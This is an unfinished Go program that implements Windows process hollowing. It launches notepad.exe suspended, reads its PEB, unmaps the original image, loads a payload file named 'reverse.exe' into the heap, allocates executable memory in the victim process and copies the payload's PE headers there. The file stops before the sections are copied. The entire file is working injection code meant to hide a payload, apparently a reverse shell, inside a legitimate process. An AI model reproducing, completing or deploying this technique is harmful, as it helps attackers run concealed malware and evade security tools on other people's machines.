package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Structs definiton for undocumented data structures taken from https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h
// and https://github.com/winlabs/gowin32/blob/54ddf04f16e612e71c3ebf6cd35da69b652fbbc7/wrappers/winternl.go
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessID uintptr
	Reserved3       uintptr
}

type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	BitField                 byte
	padding                  [4]byte // WinDBG says there is a 4-bytes padding here when running in 64 bits mode
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	Reserved4                [104]byte
	Reserved5                [52]uintptr
	PostProcessInitRoutine   uintptr
	Reserved6                [128]byte
	Reserved7                [1]uintptr
	SessionID                uint32
}

// This is taken from Microsoft docs
type IMAGE_SECTION_HEADER struct {
	name                 byte
	PhysicalAddress      uint32
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint16
}

// This struct are custom built for this purpose, only mapping needed fields.
// Built checking CFF Explorer
type DosHeaders struct {
	notNeeded [60]byte
	e_lfanew  uint32
}

// Mapping everything was actually quicker than doing the math of how many bytes I need to get to my target.
// Built checking CFF Explorer
type NtHeaders struct {
	Signature               uint32
	machine                 uint16
	numberOfSections        uint16
	timeDateStamp           uint32
	pointerToSymbol         uint32
	numberOfSymbols         uint32
	sizeofOptionalHeaders   uint16
	characteristics         uint16 // No way this is spelled right
	magic                   uint16
	majorLinkerVersion      byte
	minorLinkerVersion      byte
	sizeOfCode              uint32
	sideOfInitializedData   uint32
	sideOfUninitializedData uint32
	addressOfEntryPoint     uint32
	baseOfCode              uint32
	imageBase               uint64
	sectionAlignment        uint32
	fileAlignment           uint32
	majorOS                 uint16
	minorOS                 uint16
	majorImageVersion       uint16
	minorImageVersion       uint16
	majorSubVersion         uint16
	minorSubVersion         uint16
	win32Version            uint32
	sizeOfImage             uint32
	sizeOfHeaders           uint32
	checksun                uint32
	subsystem               uint16
	dllChars                uint16
	sizeOfStackReserve      uint64
	sizeOfStackCommit       uint64
	sizeOfHeapReserve       uint64
	sizeOfHeapCommit        uint64
	loaderFlags             uint32
	numberOfRva             uint32
}

func main() {

	var (
		// Misc variables
		targetProcess           = "C:\\Windows\\System32\\notepad.exe" // The process we want to hollow out
		targetProcessUTF16, _   = windows.UTF16FromString(targetProcess)
		injectedProcess         = "reverse.exe" // Our PE payload
		injectedProcessUTF16, _ = windows.UTF16FromString(injectedProcess)

		// DLL functions that are not defined in the windows package
		// ReadFile is defined, but forces me to use a byte array. I wanna use the pointer to the space allocated on the heap instead.
		ntdll                     = windows.NewLazyDLL("Ntdll.dll")
		ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
		ntUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
		kernel32DLL               = windows.NewLazyDLL("Kernel32.dll")
		readProcessMemory         = kernel32DLL.NewProc("ReadProcessMemory")
		getFileSize               = kernel32DLL.NewProc("GetFileSize")
		getProcessHeap            = kernel32DLL.NewProc("GetProcessHeap")
		heapAlloc                 = kernel32DLL.NewProc("HeapAlloc")
		readFile                  = kernel32DLL.NewProc("ReadFile")
		virtualAllocEx            = kernel32DLL.NewProc("VirtualAllocEx")
		writeProcessMemory        = kernel32DLL.NewProc("WriteProcessMemory")
	)

	// Start the target process in a suspended state
	var startupInfo windows.StartupInfo
	var processInfo windows.ProcessInformation
	fmt.Println("[+] Starting victim process")
	err := windows.CreateProcess(nil, &targetProcessUTF16[0], nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)
	defer windows.CloseHandle(processInfo.Process)
	if err != nil {
		fmt.Println("[-] Failed to start victim process")
	}

	fmt.Printf("[+] Started process PID %d\n", processInfo.ProcessId)

	// Try to find victim process' PROCESS_BASIC_INFORMATION
	var procBasicInfo PROCESS_BASIC_INFORMATION // Cannot use processInfo here, since the windows package does not support this. A buffer this size should do.
	var returnedLength uint32
	r1, _, _ := ntQueryInformationProcess.Call(
		uintptr(processInfo.Process),
		uintptr((uint32)(0)), // ProcessBasicInformation
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&procBasicInfo)))), // Inspired by https://github.com/winlabs/gowin32/blob/master/process.go
		uintptr((uint32)(unsafe.Sizeof(procBasicInfo))),
		uintptr(unsafe.Pointer(&returnedLength)),
	)
	if r1 != 0 {
		log.Fatal("[-] Failed to retrieve victim's PROCESS_BASIC_INFORMATION")
	}
	fmt.Printf("[+] Retrieved PROCESS_BASIC_INFORMATION, returned %d bytes\n", returnedLength)

	// Trying to retrieve PEB
	var peb PEB
	var bytesRead uint32
	r1, _, _ = readProcessMemory.Call(
		uintptr(processInfo.Process),
		procBasicInfo.PebBaseAddress,
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&peb)))),
		uintptr((uint32)(unsafe.Sizeof(peb))),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to retrieve victim's PEB")
	}
	fmt.Printf("[+] Retrieved PEB and BaseImageAddress, read %d bytes\n", bytesRead)

	// Trying to hollow target process
	r1, _, _ = ntUnmapViewOfSection.Call(
		uintptr(processInfo.Process),
		peb.ImageBaseAddress,
	)
	if r1 != 0 {
		log.Fatal("[-] Failed to unmap target process image memory location")
	}
	fmt.Println("[+] Successfully unmapped target process memory")

	// Trying to write the payload executable to memory
	file, err := windows.CreateFile(&injectedProcessUTF16[0], windows.GENERIC_READ, 0, nil, windows.OPEN_ALWAYS, 0, 0)
	defer windows.CloseHandle(file)
	if err != nil {
		fmt.Println("[-] Failed to open file")
		log.Fatal(err)
	}
	fileSizeUintptr, _, _ := getFileSize.Call(uintptr(file), uintptr(unsafe.Pointer(nil)))
	fileSize := (uint32)(fileSizeUintptr)
	fmt.Printf("[+] Read file %s, total of %d bytes\n", injectedProcess, fileSize)
	heap, _, _ := getProcessHeap.Call()
	heapHandle := (windows.Handle)(heap)
	defer windows.CloseHandle(heapHandle)
	if heap == 0 {
		log.Fatal("[-] Failed to get process heap")
	}
	// dwFlags = 0x00000008 should be HEAP_ZERO_MEMORY
	heapStartPtr, _, _ := heapAlloc.Call(heap, uintptr((uint32)(8)), uintptr((uint32)(fileSize)))
	if heapStartPtr == 0 {
		log.Fatal("[-] Failed allocate space on the heap")
	}
	bytesRead = 0
	r1, _, _ = readFile.Call(
		uintptr(file),
		heapStartPtr, // This I could have not done with the funtion defined in the windows package
		uintptr((uint32)(fileSize)),
		uintptr((uint32)(bytesRead)),
		uintptr(unsafe.Pointer(nil)),
	)
	// Would expected to check that readBytes matches fileSize here, but apparently readBytes returns 0 if reading to
	// EOF (which we are doing) as descibed here https://devblogs.microsoft.com/oldnewthing/20150121-00/?p=44863
	if r1 == 0 {
		log.Fatal("[-] Failed to write payload to the heap")
	}
	fmt.Println("[+] Successfully written payload to heap")

	// Trying to get the SizeOfImage of our payload executable from the file we just copied into memory
	dosHeaders := (*DosHeaders)(unsafe.Pointer(heapStartPtr))
	ntHeadersStartPrt := heapStartPtr + uintptr(dosHeaders.e_lfanew)
	ntHeaders := (*NtHeaders)(unsafe.Pointer(ntHeadersStartPrt))
	fmt.Println("[+] Retrieved payload's SizeOfImage")

	// Trying to allocate enough memory on victim process to fit our payload in
	r1, _, _ = virtualAllocEx.Call(
		uintptr(processInfo.Process),
		uintptr(peb.ImageBaseAddress),
		uintptr(ntHeaders.sizeOfImage),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to allocate memory on the victim process")
	}
	// Get image base delta for later
	//imageBaseDelta := peb.ImageBaseAddress - uintptr(ntHeaders.imageBase)
	fmt.Println("[+] Successfully allocated memory on victim process")

	// Trying to write payload to target process
	// Starting with the headers
	var bytesWritten uint32
	ntHeaders.imageBase = uint64(peb.ImageBaseAddress)
	r1, _, _ = writeProcessMemory.Call(
		uintptr(processInfo.Process),
		peb.ImageBaseAddress,
		heapStartPtr,
		uintptr(ntHeaders.sizeOfHeaders),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if r1 == 0 || bytesWritten != ntHeaders.sizeOfHeaders {
		log.Fatal("[-] Failed to copy headers to remote process")
	}
	fmt.Println("[+] Copied headers to target process")

	// Now we copy PE sections

}
